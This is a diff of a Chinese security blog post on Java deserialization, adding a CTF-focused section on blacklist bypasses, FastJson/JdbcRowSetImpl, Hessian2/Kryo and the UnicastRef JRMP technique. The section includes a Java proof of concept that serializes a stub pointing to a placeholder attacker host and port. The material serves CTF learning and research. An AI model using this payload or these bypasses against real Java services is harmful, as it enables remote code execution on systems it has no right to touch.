@@ -26,8 +26,13 @@
 <meta property="og:description" content="CC链参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;kingbridge&#x2F;articles&#x2F;16254517.html#%E8%BD%A6%E8%81%94%E7%BD%91ezcc     利用链 Commons Collections版本 JDK版本范围 关键限制因素 入口类    CC1 3.1 - 3.2.1 ≤ JDK 8u65 JDK 8u71修复AnnotationInvoc">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="d:\java_ser_gui\cc.jpg">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251119130438863.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251119130457494.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251119130543142.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251119130554324.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251119160027491.png">
 <meta property="article:published_time" content="2025-10-22T09:14:24.000Z">
-<meta property="article:modified_time" content="2025-10-23T01:16:09.917Z">
+<meta property="article:modified_time" content="2025-11-19T08:49:24.950Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="JAVA安全">
 <meta property="article:tag" content="JAVA反序列">
@@ -359,7 +364,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">31</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -399,7 +404,7 @@
                     <div class="author flex items-center">
                         <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
                         
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                         
                     </div>
                     <div class="meta-info">
@@ -413,8 +418,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-10-23 09:16:09</span>
-            <span class="mobile">2025-10-23 09:16:09</span>
+            <span class="desktop">2025-11-19 16:49:24</span>
+            <span class="mobile">2025-11-19 16:49:24</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -551,6 +556,80 @@
 <h2 id="CC7-调用链"><a href="#CC7-调用链" class="headerlink" title="CC7 调用链"></a>CC7 调用链</h2><p>cc7就是cc6换了一个出口,整体的逻辑没有太大的变化</p>
 <div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.<span class="built_in">readObject</span>()</span><br><span class="line">    HashTable.<span class="built_in">readObject</span>()</span><br><span class="line">        HashTable.<span class="built_in">reconstitutionPut</span>()</span><br><span class="line">            AbstractMapDecorator.<span class="built_in">equals</span>()</span><br><span class="line">                AbstractMap.<span class="built_in">equals</span>()</span><br><span class="line">    				m.<span class="built_in">get</span>()</span><br><span class="line">                    LazyMap.<span class="built_in">get</span>()</span><br><span class="line">                        ChainedTransformer.<span class="built_in">transform</span>()</span><br><span class="line">                            ConstantTransformer.<span class="built_in">transform</span>()</span><br><span class="line">                            InvokerTransformer.<span class="built_in">transform</span>()</span><br><span class="line">                                Method.<span class="built_in">invoke</span>()</span><br><span class="line">                                    Class.<span class="built_in">getMethod</span>()</span><br><span class="line">                            InvokerTransformer.<span class="built_in">transform</span>()</span><br><span class="line">                                Method.<span class="built_in">invoke</span>()</span><br><span class="line">                                    Runtime.<span class="built_in">getRuntime</span>()</span><br><span class="line">                            InvokerTransformer.<span class="built_in">transform</span>()</span><br><span class="line">                                Method.<span class="built_in">invoke</span>()</span><br><span class="line">                                    Runtime.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure></div>
 
+<h1 id="CTF中的java反序列化"><a href="#CTF中的java反序列化" class="headerlink" title="CTF中的java反序列化"></a>CTF中的java反序列化</h1><p>参考<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17872" >https://xz.aliyun.com/news/17872 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="分析入口点"><a href="#分析入口点" class="headerlink" title="分析入口点"></a>分析入口点</h2><p>拿到题目，有附件最好。有些题目就算不给附件源码也并非是黑盒，可以通过路径穿越等方式把源码拉取下来，例如[网鼎杯 2020青龙组]FileJava。</p>
+<p>题目比较常见的是Spring Boot框架。找到入口点，分析反序列化的具体方式。CTF中的Java反序列化一般是三种方式：</p>
+<p>​	1. 原生反序列化</p>
+<p>​    2. Jackson&#x2F;FastJson反序列化</p>
+<p>​	3. 框架自写的反序列化（Hessian2&#x2F;Kryo）</p>
+<h3 id="原生反序列化入口点分析"><a href="#原生反序列化入口点分析" class="headerlink" title="原生反序列化入口点分析"></a>原生反序列化入口点分析</h3><p>以**[MTCTF2022]easyjava**为例：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251119130438863.png"
+                      alt="image-20251119130438863"
+                ></p>
+<p>使用了自写的MyObjectInputStream类来处理反序列化，<strong>一般来说都会重写resolveClass方法对黑名单类进行一次判断</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251119130457494.png"
+                      alt="image-20251119130457494"
+                ></p>
+<p>这种黑名单判断是无法绕过的，其原理在于原生反序列化流程会创建一个desc（类描述符），其name属性是类的全限定名，resolveClass方法对desc里的name属性进行黑名单检测，这里的desc是我们无法自行修改的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251119130543142.png"
+                      alt="image-20251119130543142"
+                ></p>
+<p>还有一种黑名单对String进行包名检测：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251119130554324.png"
+                      alt="image-20251119130554324"
+                ></p>
+<p>这个可以用<code>TF-8 Overlong Encoding</code>绕过</p>
+<p>那对于resolveClass方法对desc.name进行黑名单检测，一般的思路是如何的呢？</p>
+<ol>
+<li><p>最好是0day，但是常规来说也没人专门捏着0day往这里砸吧；</p>
+</li>
+<li><p>其次是黑名单里没写的类，比如UncaistRef或者其外面的代理类（这个类的优点我下面会讲）；</p>
+</li>
+<li><p>再者是打二次反序列化，不走题目给的resolveClass逻辑······但是往往一些比较常用的二次反序列化类（Signedobject、RmiConnector）也放不出来，自己多积累几个。</p>
+</li>
+<li><p>最后就是看看题目给的一些类。</p>
+</li>
+</ol>
+<h3 id="Jackson-FastJson反序列化"><a href="#Jackson-FastJson反序列化" class="headerlink" title="Jackson&#x2F;FastJson反序列化"></a>Jackson&#x2F;FastJson反序列化</h3><p>部分CTF题目有用到这种反序列化，比如<strong>Bugku-CTF-Java Fastjson Unserialize</strong>、**[VNCTF2021]realezjvav<strong>等。但是原理比较简单，无非起一个远程服务，然后反序列化</strong>com.sun.rowset.JdbcRowSetImpl**等类触发一个RMI或者LDAP请求。这里就不做赘叙。</p>
+<h3 id="框架自写的反序列化（Hessian2-Kryo）"><a href="#框架自写的反序列化（Hessian2-Kryo）" class="headerlink" title="框架自写的反序列化（Hessian2&#x2F;Kryo）"></a>框架自写的反序列化（Hessian2&#x2F;Kryo）</h3><p>无论是Hessian2还是Kryo，其原理都是在反序列化过程中，如果反序列化对象是Map类，都会调用对应的put方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251119160027491.png"
+                      alt="image-20251119160027491"
+                ></p>
+<h2 id="UnicastRef类"><a href="#UnicastRef类" class="headerlink" title="UnicastRef类"></a>UnicastRef类</h2><p>新学到了一个<code>Java JRMP 反序化</code>，RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为 Java 定制，基于 TCP&#x2F;IP 之上，RMI 协议之下，当需要进行 RMI 远程方法调用通信的时候要求服务端与客户端都为 Java 编写。</p>
+<p>这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范，RMI 底层默认使用的 JRMP 进行传递数据，并且 JRMP 协议只能作用于 RMI 协议。</p>
+<p>利用UnicastRef类，它有以下几个优点：</p>
+<ol>
+<li><p>JDK自带的，对依赖没有要求</p>
+</li>
+<li><p>该类有readExternal方法，相当于readObject方法，无需为寻找调用链烦恼</p>
+</li>
+<li><p>jrmp服务端响应的数据走系统的反序列化流程而不是题目重写的MyObjectInpuct()</p>
+</li>
+<li><p>黑名单禁止该类？我有更多的方法（下文讲）。</p>
+</li>
+</ol>
+<p>缺点：</p>
+<ol>
+<li>本质上是打一个JRMP请求，不能断网，环境必须出网（现在大部分比赛几乎都是不出网）</li>
+<li>黑名单常客，绕过：<a class="link"   target="_blank" rel="noopener" href="https://blog.hackpax.top/JavaDeserializeLabs/#0x07-Lab7" >https://blog.hackpax.top/JavaDeserializeLabs/#0x07-Lab7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ol>
+<h3 id="参考POC："><a href="#参考POC：" class="headerlink" title="参考POC："></a>参考POC：</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.DGCImpl_Skel;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIServerImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">payload</span> <span class="operator">=</span> payload();</span><br><span class="line">        <span class="type">RMIConnectionImpl_Stub</span> <span class="variable">rmiConnectionImplStub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnectionImpl_Stub</span>(payload);</span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(rmiConnectionImplStub);</span><br><span class="line">        System.out.println(bytesTohexString(serialize));</span><br><span class="line"><span class="comment">//        deserialize(serialize);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> UnicastRef <span class="title function_">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>, <span class="number">13999</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt;  <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        out.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        out.writeInt(<span class="number">1896</span>);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] ser)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser));</span><br><span class="line">        <span class="keyword">return</span> (T) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesTohexString</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">2</span> * bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">15</span> &amp; bytes[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">                ret.append(<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class="line">                b = <span class="number">15</span> &amp; bytes[i];</span><br><span class="line">                ret.append(<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ret.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
 <h1 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h1><p>shiro反序列化可以说是每年护网的热门了，其实<strong>shiro框架本身是没有安全问题</strong>的，但是shiro会产生安全问题的主要原因是因为其可以<strong>让用户反序列化任意类</strong>，如果在使用shiro框架的项目中有上述的CC调用链，那么攻击者就可以利用其<strong>反序列化恶意链</strong>进而RCE</p>
 <p><strong>shiro的主要作用就是进行身份验证</strong></p>
 <h2 id="shiro反序列化的流程"><a href="#shiro反序列化的流程" class="headerlink" title="shiro反序列化的流程"></a>shiro反序列化的流程</h2><blockquote>
@@ -591,7 +670,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-10-23 09:16:09
+                    :</strong> 2025-11-19 16:49:24
             </li>
         
         <li>
@@ -718,7 +797,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">java反序列化专题</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC%E9%93%BE"><span class="nav-text">CC链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CC1-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC1 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC2-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC2 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC3-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC3 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC4-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC4 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC5-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC5 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC6-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC6 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC7-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC7 调用链</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">shiro反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">shiro反序列化的流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-550"><span class="nav-text">Shiro-550</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-721"><span class="nav-text">Shiro-721</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="nav-text">小插曲</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">fastjson反序列化</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC%E9%93%BE"><span class="nav-text">CC链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CC1-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC1 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC2-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC2 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC3-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC3 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC4-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC4 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC5-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC5 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC6-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC6 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC7-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">CC7 调用链</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF%E4%B8%AD%E7%9A%84java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">CTF中的java反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="nav-text">分析入口点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">原生反序列化入口点分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Jackson&#x2F;FastJson反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E8%87%AA%E5%86%99%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Hessian2-Kryo%EF%BC%89"><span class="nav-text">框架自写的反序列化（Hessian2&#x2F;Kryo）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UnicastRef%E7%B1%BB"><span class="nav-text">UnicastRef类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83POC%EF%BC%9A"><span class="nav-text">参考POC：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">shiro反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">shiro反序列化的流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-550"><span class="nav-text">Shiro-550</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-721"><span class="nav-text">Shiro-721</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="nav-text">小插曲</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">fastjson反序列化</span></a></li></ol>
 
     </div>
 </div>
